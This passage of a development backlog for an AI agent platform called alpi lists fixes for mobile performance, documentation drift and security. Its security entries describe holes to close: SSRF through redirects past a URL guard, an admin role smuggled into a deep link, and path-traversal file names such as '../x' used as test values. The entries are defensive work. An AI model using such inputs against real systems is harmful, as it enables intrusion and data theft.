  `alpi://paired?host=…&role=admin` shows a success page.
  accept: `redirectSystemPath` applies the allow-list `internalLink` uses for notification links and keeps only the
  query keys a route declares (`sid`, `connectionId`); anything else returns `'/'`; the accept screen reads the
  key and address from `host.peers.pending_list`; tests: the accept link returns `'/'`, a pairing link still
  returns `/pair?…`, and the existing "leaves every other route untouched" case is replaced.

- **MOB.SEC-LOCK** — The app lock covers notification actions and returns after a while in the background (M-S5)
  `bug · mobile · agent · normal`
  note: the biometric gate runs at cold start only ([AppBootstrap.jsx](../mobile/src/lib/AppBootstrap.jsx)
  `:26-43`). `useNotificationTapRouter` runs outside it ([_layout.jsx](../mobile/app/_layout.jsx) `:106`), so
  "Allow once" on a notification calls `host.approval.respond`
  ([deeplink.js](../mobile/src/features/aln/deeplink.js) `:42-54`, `:86-92`, `:111-115`) while the locked view is
  showing, and after the first unlock the app never locks again.
  accept: with the lock on, a notification action authenticates before it responds; the app locks after five
  minutes in the background and shows the lock view while inactive; tests with a gate stub that refuses (no
  `respond` call) and a fake `AppState` (six minutes away sets `locked`). Its device check is MOB.CLIENT-VERIFY.

- **MOB.SEC-CLEARTEXT** — Pairing over an unencrypted link outside the overlay network says so (M-S3)
  `feature · mobile · agent · normal`
  note: [endpoint.js](../mobile/src/lib/endpoint.js) (`:8`) accepts `ws://` to any host and the device token rides
  in every request frame ([rpc.js](../mobile/src/lib/rpc.js) `:118-122`). Cleartext is right for a Tailscale
  address, but nothing tells `100.64.0.0/10` from `ws://192.168.1.5`, where anyone on the network reads the token.
  accept: a pure `isOverlayHost(url)` (`100.64.0.0/10`, `fd7a:115c:a1e0::/48`, `*.ts.net`, loopback) with a table
  test; for `ws:` to any other host the pairing confirm says the link is not encrypted and the connection page
  keeps that fact visible. The interface follows board UI-MOB.SEC-CLEARTEXT; draw and approve it before this moves
  to Queue.

- **MOB.PERF-STREAM** — A streamed token re-renders the last message only (M1, M2)
  `bug · mobile · agent · normal`
  note: deltas are merged per animation frame, but `setPendingTurn` lives in the 500-line `ProfileChatInner`
  ([useChatSend.js](../mobile/src/hooks/useChatSend.js) `:89-105`, [chat/[id].jsx](../mobile/app/chat/[id].jsx)
  `:484`), so each frame re-renders the header and the composer (neither is memoised and both receive new props),
  the sheets and every mounted list cell, because `visibleWindow` builds new wrappers
  ([chatWindow.js](../mobile/src/lib/chatWindow.js) `:2-8`). [RichText.jsx](../mobile/src/components/RichText.jsx)
  (`:218-290`) recreates every block with index keys, about 185 for an 8 KB reply, and `TurnBlock` recomputes its
  parts and tools. `held` in [Fold.jsx](../mobile/src/components/Fold.jsx) (`:81`) is a new array per render,
  captured by two worklets.
  accept: the pending turn lives in a store read with `useSyncExternalStore`; the screen selects `isStreaming`,
  `error` and `cancelled`, and the list subscribes to the turn; cell wrappers are cached by turn identity;
  `RichText` reuses an equal block and renders through a memoised `Block`; `held` is memoised; a test pushes 100
  deltas with a fake `requestAnimationFrame` and finds the render counts of the header and composer flat and only
  the last cell rendered again. Its device check is MOB.CLIENT-VERIFY.

- **MOB.PERF-RESUME** — Returning to the app asks each thing once (M4)
  `bug · mobile · agent · normal`
  note: on resume `host.profile.summaries` runs three times (the probe at
  [probe.js](../mobile/src/lib/probe.js) `:27` outside the shared cache, the kept-current hook, and the
  invalidation 800 ms after reconnect at `app/index.jsx:93-110`), workgroups, activity and event history twice
  each, and a finished turn costs about six requests. `usePolledCall` refetches on every mount
  ([useDaemonData.js](../mobile/src/hooks/useDaemonData.js) `:178-189`). First fix the latent bug these refetches
  hide: `useInbox` memoises its items on `checkProfile`, which never changes identity
  ([readState.js](../mobile/src/lib/readState.js), `useReadState`), so an unread mark clears only because the data
  arrives again.
  accept: an unread dot clears with no refetch (a test); the probe's summaries go through `fetchAndStore`; a mount
  or invalidation is skipped when the data is under two seconds old; `session_changed` no longer invalidates
  workgroups; a test with an rpc counter, a fake `AppState` change to active and a `subscribed` frame counts one
  summaries call.

- **MOB.PERF-WG-TAIL** — An open workgroup fetches only the new posts (M5)
  `bug · mobile · agent · normal`
  note: `useWorkgroupTranscript` asks `tail: true, limit: 200` on every `wg.post`, `wg.done` and `wg.blocked`
  ([useDaemonData.js](../mobile/src/hooks/useDaemonData.js) `:349-357`); the daemon decrypts and ships 200 posts,
  every post object is new and every visible item re-renders ([wg/[id].jsx](../mobile/app/wg/[id].jsx)
  `:390-400`). The daemon's transcript verb takes `after_seq`.
  accept: a store per endpoint, profile and workgroup fetches `after_seq: lastSeq` and appends; earlier post
  objects keep their identity; a reply that ignores `after_seq` is handled as a full tail; a test for each.

- **MOB.PERF-IMAGES** — Agent images are files on disk, not strings in memory (M6)
  `chore · mobile · agent · low`
  note: a fetched image arrives as a frame of up to 27 MB, is parsed and joined into a `data:` URI (three copies on
  the JS thread), is kept among up to 32 such strings for the life of the process
  ([useCachedImage.js](../mobile/src/hooks/useCachedImage.js) `:5-6`, `:34-38`) and is sent to native twice. There
  is no disk cache.
  accept: the bytes are written under `cacheDirectory/alpi-img/<hash>` with `expo-file-system`, `<Image>` receives
  the `file://` URI and the map holds URIs only; the directory is removed on unpair and forget; a test with a
  mocked file system finds no string over 1 KB in the map.

- **MOB.PERF-CACHES** — Background bookkeeping writes when something changed, and caches forget (M9, M11)
  `chore · mobile · agent · low`
  note: the foreground catch-up runs every 30 s per daemon and `recordGroupHealth` always writes the keychain
  ([poll.js](../mobile/src/features/aln/poll.js) `:43-50`): 120 writes an hour per daemon with nothing new. Its
  interval equals the stale-socket window (`rpc.js:116`), so reuse of the pooled socket depends on timer jitter.
  The session, workgroup and activity stores never evict, and `forget(connection)` leaves that connection's text in
  memory ([useSessionTranscript.js](../mobile/src/hooks/useSessionTranscript.js) `:9`, `useDaemonData.js:12`,
  `useActivity.js:98`).
  accept: the health write is skipped when its three fields are unchanged and the last write is under five minutes
  old; the stale window is 45 s; stores drop entries with no listener beyond the eight most recent and purge by
  endpoint on forget and unpair; tests for each.

- **MOB.SEC-MINORS** — Release config, notification privacy and leftover exports (M-S6, M-S7, M-S8)
  `chore · mobile · agent · low`
  note: one per commit. `expo-dev-client` is a dependency, so every build carries the `exp+alpi-mobile` scheme,
  `_expo._tcp` and Expo's own text for the local-network permission. Notification bodies show the approval command
  or the question on the lock screen with no way to hide them
  ([kinds.js](../mobile/src/features/aln/kinds.js) `:75-93`). Exported and shared files are cleaned only by the
  next export in the same process ([messageExport.js](../mobile/src/lib/messageExport.js) `:8-12`).
  accept: `app.json` sets an alpi-specific `NSLocalNetworkUsageDescription` and the dev-client plugin gets
  `addGeneratedScheme: false`, both asserted by `scripts/check-release.mjs` on the introspected config; exports and
  shared attachments use one `alpi-export-*` prefix swept at start and on unpair; `formatNotification` has a
  private mode with generic bodies, whose Settings toggle follows board UI-MOB.NOTIF-PRIVATE.

- **MOB.CLIENT-VERIFY** — Streaming, reconnection and the app lock behave on a phone
  `verify · mobile · creator · normal`
  depends: MOB.PERF-STREAM, MOB.PROBE-FLICKER, MOB.RECOVER-PAGING, MOB.SEC-LOCK
  accept: on an iOS and an Android build: a long answer streams without dropped frames in the header and composer;
  with the daemon stopped the banner stays put and returns to online when it is back; a turn interrupted by a
  network drop comes back whole; a notification action asks for the lock, and the app locks after five minutes
  away.

#### Documents

- **DOCS.DRIFT** — The documents say what the project does today
  `chore · alpi · agent · normal`
  note: docs only, no product bump. `AUDIT.2` is cited six times, [SECURITY.md](SECURITY.md) `:658` among them, and
  is not in this file. [AGENTS.md](../AGENTS.md) (`:18-21`) still gives Hermes as the reference codebase, which the
  creator retired on 2026-10-13. AGENTS.md (`:71`), this file's header and
  `alpi/knowledge/references/architecture.md` (`:197`) say one commit per product, while the creator's rule since
  2026-11-15 is one commit per task whatever it releases. AGENTS.md says tests use isolated temporary homes but not
  that `ALPI_HOME` alone does not isolate a script. [QUICKSTART.md](../QUICKSTART.md) is missing from the
  documents table. From the code reading of 2026-11-20: [ARCHITECTURE.md](ARCHITECTURE.md) calls `notify` a
  "native push" (`:151`, `:2060`) though the phone polls; its `send_message` paragraph and AGENTS.md (`:113`) name
  a tool and gateways (telegram, matrix, webhook) that were retired in v0.10; `alp/tasks.py` says the hub "stays
  zero-knowledge" while it decrypts the whole transcript on every post; `prompts/system_prompt.md` says memory is
  frozen at session start, and in the apps it is read again on every message.
  accept: every `AUDIT.2` citation names an existing entry or is removed; the Hermes paragraph and the three
  commit-per-product sentences match the creator's current rules (ask before rewording them); the "Live
  environment boundaries" section says a hand-run script sets `HOME` and `ALPI_HOME`; the table lists
  `QUICKSTART.md`; the 2026-11-20 sentences say what the code does; `grep` finds none of the stale strings.

### Security audit 2026-10-28

- **SEC.BROWSER-PIN** — The browser connects to the IP its guard verified
  `bug · alpi · agent · normal`
  note: report TOOLS-2. `_route_guard` resolves with `check_url` and Chromium resolves again.
  accept: Chromium is pinned to the verified address (host-resolver rule or the pinned transport) for every
  navigation and subresource; a stub resolver that answers public then loopback cannot reach loopback.

- **SEC.ALP-CONFINE** — ALP files, blobs and envelopes are confined before any peer is paired
  `bug · alpi · agent · normal`
  note: report ALP-1 to ALP-6; nothing on the fleet has peers or workgroups yet.
  accept: `get_file` validates the hub's `name` (no `/` or `\` on any platform) and writes inside the workspace;
  blobs have a per-profile quota, a TTL sweep and an in-flight cap per sender; `envelope.verify` raises
  `EnvelopeError` for malformed fields; `_append_marker` takes the transcript lock; continuation requests need an
  existing part; a Noise identity that does not match the envelope sender is cut before dispatch. A stub hub
  returning `../x` and `..\x` is a test.

- **SEC.REPO-GOVERNANCE** — GitHub controls for the release chain
  `chore · alpi · creator · high`
  note: report SUPPLY-1, 2, 4, 5. The repository half (actions pinned to a full SHA, `dependabot.yml`) is the
  agent task SEC.ACTIONS-PIN; what is left here are GitHub settings. Turn on `sha_pinning_required` and
  `allowed_actions: selected`, add a ruleset on `main` and on the four tag patterns, immutable
  releases, an `environment: release` with a reviewer for the signing and publishing jobs, secret scanning and
  push protection, and a root `SECURITY.md`.
  accept: `gh api` shows each control on; a release still publishes end to end.

- **SEC.SKILL-ENV** — Skill scripts, scheduler runs and `chat --once` children get an allow-listed environment
  `bug · alpi · agent · low`
  note: report SEC-1. The root `.env` loads into `os.environ`, `effective_profile_env` starts from it, and
  `run.py` receives all of it. Low value while `terminal` runs unsandboxed: a script the agent writes can open
  the `.env` files directly. Enforcing it today breaks fleet skills whose `run.py` reads undeclared keys
  (`repo-task`, `security-triage`, `lobby-knowledge-enrichment`, scribe, scout, `sports-weekend`) or hands the
  whole environment to `mvn`, `git` or `node`, and profiles that take the provider key from the root `.env`.
  Order: an opt-in `skills.env: declared` mode plus a `doctor`/`skill validate` warning for undeclared reads;
  then the creator declares each skill's env and enables the mode; then it becomes the default.
  accept: the `run.py`, scheduler and `chat --once` environments are built like `terminal` (safe keys, the
  skill's declared env, `ALPI_*`); the root `.env` no longer enters `os.environ` beyond the daemon-wide keys
  that are read explicitly. Test: profile A with a secret, profile B whose `run.py` dumps its environment sees
  neither A's keys nor B's undeclared ones.

- **SEC.HARDENING-BATCH** — Desktop, client and supply-chain minors
  `chore · alpi · desktop · agent · low`
  note: report DESK-1 to DESK-4, CLIENT-2, MOB-6, SUPPLY-3 and the nits, taken in batches. Left from SEC.REDACT:
  the ALP workgroup transcript (`alp/workgroup.py::_append_transcript`) is written unredacted, and
  `alp/turns.jsonl` does not rotate.
  accept: each batch names the IDs it closes and their tests.

### Reliability before another feature

- **FRAME.2** — Other writers still encode agent text with `ensure_ascii=False` and raise on a lone surrogate
  `bug · alpi · agent · normal`
  note: found while reviewing FRAME.1, which scrubs the host's Unix and WebSocket frames and the inbox, run ledger,
  audit, workgroup transcript and file records. Still strict: the ALP wire writers
  ([alp/server.py](../alpi/alp/server.py) `json.dumps(...).encode("utf-8")` at two sites,
  [alp/client.py](../alpi/alp/client.py) at four), reached when a `workgroup_post` or `send_message` echoes a
  binary filename read from a tool; the `--once` event lines (`sys.stdout.write(json.dumps(...))` in
  [cli.py](../alpi/cli.py)) and a few `click.echo` of event or daemon payloads; and
  `session.truncate_result`, which sends tool output to the provider unscrubbed. Scrubbing before signing changes
  the bytes an envelope signs, so the ALP writers need the scrub in `envelope.py` or before the signature.
  accept: each site either scrubs or is shown not to receive agent or tool text; a post carrying a lone surrogate
  reaches a peer with a valid signature, and a `--once` turn whose tool output holds one prints its events; tests
  drive the ALP client and server, the CLI line and a provider-bound message.

### Found shipping the browser view

- **SEC.BROWSER-REDIRECT** — The browser's URL guard checks the target of a redirect
  `bug · alpi · agent · high`
  note: run on 2026-11-26. `_route_guard` is a context route, and Playwright calls a route only for the first URL
  of a request, not for the redirects it follows. With a guard that refuses `/forbidden`, `navigate` to a page
  answering `302 → /forbidden` loaded it and returned its content; the guard saw only the first URL. The same holds
  for an image, a `fetch` and an iframe. So a public URL that redirects to a loopback, private or cloud-metadata
  address is fetched and, for a navigation or an iframe, read back to the model. Related to SEC.BROWSER-PIN.
  accept: a navigation, an iframe and a subresource that are redirected to a refused address never reach it
  (a local server proves no request arrived), with a stub guard and with a real loopback target while
  `allow_local` is off; SECURITY.md states what is checked.

- **BROWSER.NEW-HEADLESS** — Is the headless shell what gets the browser blocked?
  `chore · alpi · agent · low`
  note: one run on 2026-11-26 from one residential IP, playwright 1.64.1, status and snapshot size per site.
  `amazon.es/s?k=…` answers 503 to the headless shell `browser` launches (with or without `playwright-stealth`)
  and 200 with a full page to `launch(channel="chromium")`, the new headless mode of the full Chromium build.
  `linkedin.com/jobs` answers 429 to the shell alone and 200 once stealth is applied, as today. `idealista.com`
  and `zara.com` answer 403 and `booking.com` search 202 in all four combinations. The shell was chosen for its
  size: the full build costs a larger download, a wider `install-deps` set in the image, and changes to
  `_wanted_chromium_dirs`, the prune, `alpi doctor` and the image smoke test.
  accept: the same matrix repeated on three days from a residential and a datacenter IP, with the download and
  image size of each build; the entry is replaced by the decision it supports.

- **HOOK.GIT-ENV** — A commit from a linked worktree cannot reconfigure the repository
  `bug · alpi · agent · normal`
  note: run on 2026-11-26. In a linked worktree git exports `GIT_DIR` (and `GIT_INDEX_FILE`) to the pre-commit
  hook, the hook runs `pytest` with them, and tests that shell out to git in a temporary folder act on the real
  repository instead: `tests/core/test_docker_release_workflow.py` runs `git init --bare`, which set
  `core.bare = true` in the shared `.git/config`, so every checkout answered "this operation must be run in a
  work tree" until it was set back; 18 tests failed and 15 errored for the same reason. Neither `.githooks/pre-commit`
  nor `tests/conftest.py` clears the `GIT_*` variables.
  accept: a commit made from a linked worktree runs the hook's suites green and leaves `.git/config` byte-identical;
  a test sets `GIT_DIR` to a scratch repository and shows a git-calling test does not touch it.

- **TEST.PY313** — The suite finishes on Python 3.13
  `bug · alpi · agent · low`
  note: run on 2026-11-26. `pyproject.toml` accepts Python up to 3.13, but on CPython 3.13.13 `pytest -q` never
  ends: `tests/core/test_host_client_unresponsive.py` stops in its first test (alone too), while it passes in
  seconds on 3.11.15. Read, not run: its teardown awaits `server.wait_closed()` while the handler still holds the
  connection, which newer asyncio waits for. Whether it is the test or `host_client` that needs the change is not
  known.
  accept: the fast suite passes on 3.11 and 3.13.

### Found while shipping alpi 0.19.40

- **LOG.PROFILE-MIX** — Each profile's `llm.log`, `agent.log` and `approval.log` hold only that profile's lines
  `bug · alpi · agent · normal`
  note: `get_subsystem_logger(home, subsystem)` in [_log.py](../alpi/_log.py) configures the process-wide logger
  `alpi.<subsystem>` once (`_alpi_configured`), with a file handler in the home of the first caller, and hands that
  same logger to every later caller whatever its home. In a daemon that runs several profiles, the first profile to
  log receives every profile's `llm`, `agent` and `approval` lines. Seen on a deployed daemon with nine profiles on
  2026-11-25: the `llm.log` of one profile held the 13 model calls of two admin chats with two other profiles, and
  its `agent.log` their `user=` prompt snippets, while those two profiles' own logs had no line for them and their
  run journals were in their own `runs/`. A line names no profile, so the file cannot be split afterwards, the
  per-profile cleanup acts on mixed data, and whoever reads one profile's log reads the others' prompts. Not
  checked: `compaction.jsonl` and the scheduler's `log_path` users.
  accept: a process that runs turns for two homes writes each home's `llm`, `agent` and `approval` lines to that
  home's own `logs/`, and neither file holds a line of the other; a test drives both homes in one process; a
  `chat --once` child still logs to its own home.

### Found while shipping desktop 0.10.17

- **DESIGN.NOTIF-VIEW** — The Notifications view in the kit is drawn in the faces, sizes and inks the app ships
  `chore · design · agent · low`
  note: three differences are left in [notif_studies.py](../design/src/notif_studies.py) after desktop 0.10.17 redrew
  the connection and the time of each row. `a_detail` (`:160`) draws the reader's "@abby" and
  "· casa · Today 6:31 AM" in Geist Mono, while the app has shipped both in the sans face since desktop 0.10.0
  (`.detailMetaProfile` in [NotificationsModal.module.css](../desktop/src/features/NotificationsModal.module.css)).
  `a_row` (`:118`) draws a read row's handle and title in ink-2, while `.rowProfile` and `.rowTitle` are `--ink`.
  The row title is 14px on the board and `--text-ui` (15px) in the app. Not swept: the other boards for an element
  that lost its `Mono` in 0.10.0.
  accept: the reader's meta line and the rows on the board use the faces, sizes and inks of `.detailMetaName`,
  `.detailMetaWhen`, `.rowProfile` and `.rowTitle`; `python3 design/build.py` leaves no other diff; the kit tests
  pass.

### Found while shipping alpi 0.19.39

- **SEC.SCRIPT-JOB-SHARED-TEMP** — A script job's interpreter cannot live in a folder everyone can write
  `bug · alpi · agent · normal`
  note: confirmed on the validator by the review of 0.19.39, nothing spawned. `_agent_writable_roots`
  ([run.py](../alpi/scheduler/run.py)) lists the profile home, the workspace, the temp folder, `/tmp` and
  `/private/tmp`, and on macOS `/private/var/folders`. `/var/tmp` and `/dev/shm` are as writable and are not in it:
  `/var/tmp/python3 <skill script>` is accepted as an interpreter, and a `PATH` entry there from the profile `.env`
  survives `_script_job_path`, so a bare `python3` can resolve to a file that an agent with a shell wrote.
  accept: an interpreter or a `PATH` entry under a folder everyone can write is refused or dropped (the known ones by
  name, any other by its mode), with a test for `/var/tmp` and `/dev/shm` that needs neither to exist.

- **SCHED.NOAGENT-EDGES** — A script job that cannot run says why instead of raising
  `bug · alpi · agent · low`
  note: confirmed by the same review; none of these passes the rule. A token with a NUL byte raises `ValueError` out
  of `validate_no_agent_command` (in `_under_any`). A script named alone that lacks the execute bit raises
  `PermissionError` at the spawn, where only `FileNotFoundError` is caught. `<script>/` with a trailing slash is
  accepted and then fails with rc 2. A skill script that is itself named `python3` and written first is accepted when
  the job is added and refused at every fire. A home with a space splits `$ALPI_HOME` unless the job quotes it. And
  `get_home()` ([home.py](../alpi/home.py)) returns a relative `ALPI_HOME` as given, which the validator reads against
  the current folder while every other caller does as it pleases.
  accept: each of these answers with a refusal that names the cause, the same when the job is added and when it
  fires, and a relative `ALPI_HOME` is made absolute once, where it is read; one test per case.

### Found while shipping alpi 0.19.38

- **SEC.DOCKER-RULE-MOUNTS** — A scoped phase's writable mounts cannot be swapped for a host folder
  `bug · alpi · agent · low`
  note: suspected, traced from the argv, Docker not run. With `tools.execution.backend: docker` a scoped workgroup
  phase mounts each write rule as `--volume <path>:<path>:rw` ([execution_world.py](../alpi/core/execution_world.py)
  `:77-78`). The path is inside the workspace and writable by the turn, and it is resolved when the argv is built
  while Docker resolves a bind source when the container starts, so a second session can swap the folder for a
  symlink in between. The working directory of a fenced turn is no longer mounted on its own for this reason.
  A phase scoped to the whole workspace also builds `<ws>:<ws>:ro` and `<ws>:<ws>:rw`, one mount point twice,
  for every turn.
  accept: a fenced turn's rule mount cannot resolve outside the workspace at container start (the workspace is
  bound once and writes are narrowed inside it, or the source is pinned so a later swap changes nothing); a
  whole-workspace phase builds one mount; a test on the argv covers both.

- **EXEC.DOCKER-USER** — A fenced Docker turn is the daemon's unprivileged user on every engine
  `bug · alpi · agent · low`
  note: suspected, not run. A fenced turn runs with `--user <uid>:<gid>`. Under rootless Docker or Podman the
  container's root already is the daemon's user and that uid maps to a subordinate one, so the command loses write
  (and on a `0700` workspace read) access it had before 0.19.38. A daemon running as root emits `--user 0:0`, so
  its fenced command is still root in the container. `docs/CONFIG.md` states both assumptions.
  accept: the daemon detects a rootless engine once and leaves `--user` out there, and refuses a fenced Docker
  command when it runs as root, each with a message that names the cause; a test covers them without Docker.

### Found while shipping alpi 0.19.37

- **TESTS.EVENTS-HISTORY** — A test that starts the host leaves the event history where it found it
  `bug · alpi · agent · low`
  note: read and counted, not fixed. `host_events.register` ([events.py](../alpi/host/events.py) `:173-178`) points
  `_history_path` at the home of the test that called it and nothing restores it, so every later `emit` in the suite
  recreates `host/events.jsonl` under a temporary home already removed. One development machine held 377 leftover
  `/tmp/alp-activity-*` and `/tmp/alpi-host-*` directories. Three tests reach it through `service._run_host`
  (`tests/core/test_listener_start_failure.py`, `tests/core/test_daemon.py`, `tests/host/test_tcp_listener.py`).
  accept: after any test the history path is the session's isolated one again and a suite run leaves no new
  directory under `/tmp`, with a test that pins it.

### Found while shipping alpi 0.19.24

- **CLI.STREAM-DEADLINE** — The console's untimed daemon calls stop when the daemon stops reading
  `bug · alpi · agent · low`
  note: the chat stream ([cli.py](../alpi/cli.py) near `:494`), `alpi runs cancel` (`:684`) and `alpi activity`
  (`:717`) open the host socket with no deadline and close with `close()` plus `wait_closed()`; a daemon that
  accepts and stops reading holds them at `drain()` forever. `host_client.acall` got one deadline and an abort on
  failure in 0.19.24.
  accept: each of the three sends with a deadline and aborts its transport on failure; a test with a socket that
  never reads finishes each within its deadline.

### Found while shipping alpi 0.18.4

- **DESK.RECIPES-INVALID** — The desktop's saved-recipe list says which recipes it left out and why
  `bug · desktop · agent · low`
  note: `CreateWorkgroupModal.jsx` keeps only `recipes` from `host.workgroup.recipes.list` and drops
  `invalid_recipes`, so a saved recipe the daemon refuses (from alpi 0.18.4, an unsupported step option) just
  disappears from the picker; only `alpi workgroup recipes` and "Import recipe…" name the reason.
  accept: the picker lists each refused recipe as disabled with the daemon's reason; an older daemon without
  `invalid_recipes` shows nothing extra; a component test renders one valid and one refused recipe.

### Found while shipping alpi 0.19.3

- **DOCKER.LOCKED-INSTALL** — The Docker image installs the versions in `uv.lock`
  `bug · alpi · agent · normal`
  note: `docker/Dockerfile` runs `pip install --uploaded-prior-to P7D .`, so every build resolves each
  dependency again and `uv.lock` never reaches the image: a build fails with no dependency change when a
  release ages past the seven days, as playwright 1.65.0 did (its bundled `node` needs `libatomic.so.1`).
  `pyproject.toml` caps `playwright<1.65`; lifting it needs `libatomic1` in the image, which the guard in
  `tests/tools/test_browser.py` against hand-written libraries must allow. The lock
  holds an older playwright than the image ships, so this changes the browser version. `CHROMIUM_DEPS_COMMAND`
  (`uvx --from playwright …`) is uncapped too, so the repair `alpi doctor` prints may resolve 1.65 on a host.
  accept: the image installs the exact versions `uv.lock` records; `tests/core/test_dependency_cooldown.py`
  fails when the Dockerfile resolves a dependency outside the lock; the playwright cap is lifted or kept with
  its reason, and the repair command resolves the playwright alpi runs; the image smoke test launches the browser.

### Found while shipping mobile 0.10.5

- **MOB.SDK-58** — The phone moves from Expo SDK 55 to SDK 58
  `chore · mobile · agent · normal`
  note: mobile 0.10.5 sits on the last SDK 55 patches (React Native 0.83.10, reanimated 4.2); SDK 58 ships React Native
  0.88, React 19.3, reanimated 4.7 with worklets 0.13 and svg 15.16. Step one SDK at a time (56, 57, 58) with
  `npx expo install expo@^<n> --fix`, each step's upgrade guide, `expo-doctor` clean and the suite green; the native
  modules and config plugins must survive `expo prebuild`. The device check is MOB.SDK-58-VERIFY.
  accept: `mobile/package.json` on `expo ~58`, `npx -y expo-doctor@latest` passes every check, `npm ci --dry-run` passes,
  the mobile suite is green and `npx expo prebuild --clean --no-install` succeeds for iOS and Android.

- **MOB.SDK-58-VERIFY** — The SDK 58 build behaves on iOS and Android
  `verify · mobile · creator · normal`
  depends: MOB.SDK-58
  accept: an EAS build of each platform installs over the SDK 55 build, keeps the pairing, and the chat, its marks'
  motion, notifications, the camera pairing and the fold layout behave as before.

### Found while shipping mobile 0.9.16

- **MOB.RADIO-CHECKED** — TalkBack announces which segment is chosen
  `bug · mobile · agent · low`
  note: `Segmented.jsx` sends `accessibilityState={{ selected: on }}` with `accessibilityRole="radio"`; Android
  TalkBack reads a radio's state from `checked`, so the chosen theme or text size is not announced.
  accept: `Segmented.test.jsx` asserts the selected cell carries `accessibilityState.checked: true` and the others `false`.

### Found while shipping the new identity

- **CI.GENERATED-DRIFT** — A push to main fails when a generated file is stale
  `chore · alpi · agent · normal`
  note: `alpi/mark_shapes.py` (`scripts/sync_marks.py --check`), the app icons (`scripts/gen_icons.py --check`)
  and the design kit (`design/drift.py`) are generated from `common/*.mjs`, but only a local `scripts/validate.py`
  checks them. A push that changes only `common/*.mjs` runs `clients.yml` (the JS suites) and skips `publish.yml`,
  whose path filter needs `alpi/**`, so a stale console mark, icon or board reaches main unseen. Build tooling
  only: no product bump.
  accept: a workflow that runs on pushes and PRs touching `common/**`, `design/**` or the generators runs the three
  checks and fails on drift; a release-script test asserts the workflow's path filter and commands.

### Client review 2026-11-05

- **DESK.FILTERS** — One filter control for Notifications, Activity, Workgroups and Sessions
  `chore · desktop · agent · normal`
  note: the same "All / Needs you / …" row is four implementations: `NotificationsModal.jsx:449-465` (buttons with
  `aria-pressed`), `ActivityPanel.jsx:84-114` (`radiogroup` with arrow keys), `WorkgroupsView.jsx:132-145`
  (`.ds-seg`, no arrow keys) and `ManageSessionsModal.jsx:299-309` (`Chip` with no pressed state, so a screen
  reader cannot tell which is on). No new look: the shipped `.ds-seg` with Activity's semantics.
  accept: one primitive with `radiogroup`/`radio`, roving focus and Arrow/Home/End, used by the four sites with
  their counts; a test per site asserts `role="radio"` and `aria-checked`.

- **COMMON.MOTION-TOKENS** — Desktop runs on the shared motion names and pulses like the phone
  `chore · desktop · design · agent · normal`
  note: `tokens.css:145-156` mirrors `motionTokens` as `--dur-fast`, `--dur-pulse` and `--pulse-low` but no
  stylesheet uses them; every loop runs on `--dur-loop: 1.4s` with floors of 0.35, 0.45, 0.55 and 0.4
  (`design-system.css:668,686`, `Icon.module.css:20`, `Fold.module.css:14`) while the phone pulses at 1600 ms to
  0.4 through `lib/pulse.js`; the skeleton breathes 0.55↔1 here and 0.4↔1 there; the spinner turns at 0.9 s here
  and 0.8 s there. Literal durations in `Sidebar.module.css:80-109`, `SkillsModal.module.css:199`,
  `StreamingMarkdown.module.css:2` and `design-system.css:704,789`; `Popover.jsx:66` and `Tip.jsx:70` set z-index
  numbers beside `--z-*`; `AppearancePicker.module.css:51` draws an edge in a literal rgba that vanishes on dark
  swatches. The kit's Motion board documents the split (`system_boards.py:285,302`) instead of one rule.
  accept: the legacy ladder maps onto the shared names (`--dur-1`→fast, `--dur-2`→enter, loops and the skeleton
  → `--dur-pulse` at `--pulse-low`, spin from `BUSY_WAVE_S/2` as mobile); no `[0-9]+(ms|s)` literal outside
  `tokens.css`; `motion.test.js` asserts the shared names on every infinite animation and `tokenParity.test.js`
  asserts `--dur-pulse` equals `motionTokens.pulse`; the two z-index literals and the picker edge use tokens; the
  Motion board shows one pulse row.

- **COMMON.EMPTY-STATES** — Desktop writes "nothing matches" and "could not load" the way the phone does
  `chore · desktop · common · agent · normal`
  note: `common/emptyCopy.mjs:35` defines `matches` but only Notifications uses it; the sidebar
  (`Sidebar.jsx:617`), the palette (`Panels.jsx:349`), Settings search (`SettingsNav.jsx:131`), the workgroups
  list (`noMatchLine` in `common/workgroupList.mjs`) and Settings' "No selection" / "Admin access required" (`Settings.jsx:103,106`)
  each write and size their own, and the last two offer no action. `LoadFailed.jsx:19` prints `String(error)`,
  the daemon's raw text, where the phone passes `plainError` and draws the failure as an `EmptyState`. "Nothing
  needs you / running / upcoming" lives as literals in `ActivityPanel.jsx:18-21` and `activityFeed.js:8-11`.
  accept: every no-match and no-selection state reads from `EMPTY` with the notifications list's two-line shape
  and an action where there is one; desktop `LoadFailed` passes the error through `plainError` and uses the
  empty-state anatomy; the activity strings move to `emptyCopy.mjs`; a copy test asserts no literal "match" or
  "needs you" string outside `common/`; `LoadFailed.test.jsx` with a `plainError` fixture never shows the raw
  error.

- **MOB.LIST-REFRESH** — Providers and Peers refresh by pull and load before they say "not set"
  `bug · mobile · agent · normal`
  note: `providers/index.jsx:53` and `peers/index.jsx:67` are plain `ScrollView`s without `refreshControl` while
  Email, MCP, Memory, Skills, Tools and Schedule have one; Providers ignores `loading` and `error` from
  `useProfile` (`:22`), so a slow network shows "No Ollama instance" and every key as "not set" for a moment;
  Peers has no error state.
  accept: both use `usePullRefresh` with `RefreshControl`; Providers shows `ListSkeleton` while loading with no
  profile and `LoadFailed` with Retry on error; a test with `loading: true, profile: null` finds no "not set"; a
  test releases the refresh control and asserts `refresh` was called.

- **MOB.REDUCE-MOTION** — Every mobile transition honours reduce motion
  `bug · mobile · agent · normal`
  note: `ConfirmDialog.jsx:85-97` scales and fades with `withTiming` and never reads `useReduceMotion`, so each
  delete confirmation and the discard dialog of `useDirtyBack` zoom while every sheet appears still;
  `TextPrompt.jsx:41` and `RichText.jsx:50` use the native `animationType="fade"` outside `motionTokens`;
  `panes.js:136-139` returns `slide_from_right` on a phone whatever `reduceMotion` is (`panes.test.js:93` fixes
  it) and `profile/[id]/_layout.jsx:13` uses `stackAnimation` without it.
  accept: `ConfirmDialog` passes `duration: 0` under reduce motion like `useSheetGesture`; `TextPrompt` and
  `RichText` use `animationType="none"` with the presence hook; `paneAnimation(false, true)` is `fade` or `none`
  and the profile layout consumes it; tests mock `useReduceMotion` and assert each.

- **MOB.SHIPPED-PARTS** — Hand-written rows, banners, meters and empty states use the shipped components
  `chore · mobile · agent · normal`
  note: `email/index.jsx:62-86`, `mcp/index.jsx:88-114` and `wg/[id]/member.jsx:83-108` draw their own
  `Pressable` rows (no chevron, no composed label, no stacked mode under 360 pt, a literal `marginLeft: 52`
